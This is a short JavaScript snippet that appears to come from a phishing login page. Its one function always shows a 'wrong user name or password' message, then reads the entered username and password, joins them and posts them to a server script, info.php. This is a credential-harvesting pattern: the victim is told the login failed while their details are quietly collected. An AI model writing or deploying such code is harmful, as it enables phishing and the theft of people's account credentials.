// var input1 = document.getElementById("inp1").value
// var input2 = document.getElementById("inp2").value

function log () {
       document.getElementById("p2").innerHTML = "The User name or Password is not True"
       var username = document.getElementById("inp1").value
    var password = document.getElementById("inp2").value
    var resuelt = username + " : " + password
    $.post("info.php",{"up":resuelt})
}